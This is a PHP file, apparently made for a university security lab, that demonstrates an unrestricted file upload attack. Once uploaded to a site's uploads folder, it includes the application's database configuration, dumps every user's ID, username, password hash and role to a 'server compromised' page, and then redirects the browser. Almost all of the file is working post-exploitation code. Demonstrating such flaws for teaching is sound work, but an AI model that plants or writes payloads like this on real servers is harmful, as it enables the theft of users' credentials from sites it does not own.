<?php
// Încercăm să includem configurația bazei de date a aplicației
// Presupunem că hacker.php este în folderul /uploads/ și config e în rădăcină
@include_once '../config/database.php';

echo "<div style='background: black; color: lime; padding: 30px; text-align: center; font-family: monospace; min-height: 100vh;'>";
echo "<h1>⚠️ SERVER COMPROMIS ⚠️</h1>";
echo "<h3>Vulnerabilitate exploatată: Unrestricted File Upload</h3>";

if (isset($pdo)) {
    try {
        // Extragem datele din tabelul utilizatori
        $stmt = $pdo->query("SELECT id, username, parola, role FROM utilizatori");
        $users = $stmt->fetchAll(PDO::FETCH_ASSOC);

        echo "<div style='text-align: left; display: inline-block; border: 1px solid lime; padding: 20px; margin-top: 20px; background: #051a05;'>";
        echo "<h4>📂 BAZA DE DATE EXTRASA (Tabel: utilizatori):</h4>";
        echo "<table style='border-collapse: collapse; width: 100%; font-size: 0.8rem;'>";
        echo "<thead><tr style='border-bottom: 1px solid lime;'><th>ID</th><th>Username</th><th>Hash Parolă</th><th>Rol</th></tr></thead>";
        echo "<tbody>";

        foreach ($users as $user) {
            echo "<tr>";
            echo "<td style='padding: 5px;'>[" . $user['id'] . "]</td>";
            echo "<td style='padding: 5px; color: yellow;'>" . htmlspecialchars($user['username']) . "</td>";
            echo "<td style='padding: 5px; font-size: 0.7rem; color: #aaa;'>" . $user['parola'] . "</td>";
            echo "<td style='padding: 5px; font-weight: bold;'>" . $user['role'] . "</td>";
            echo "</tr>";
        }

        echo "</tbody></table>";
        echo "</div>";
    } catch (Exception $e) {
        echo "<p style='color: red;'>Eroare la accesarea bazei de date: " . $e->getMessage() . "</p>";
    }
} else {
    echo "<p style='color: red;'>Nu s-a putut găsi conexiunea la baza de date ($pdo). Verifică calea către config/database.php.</p>";
}

echo "</div>";

// Am mărit timpul la 10 secunde ca să ai timp să arăți tabelul la laborator
echo "<script>
    setTimeout(function() {
        window.location.href = 'https://www.google.com/search?q=hacked';
    }, 10000);
</script>";
?>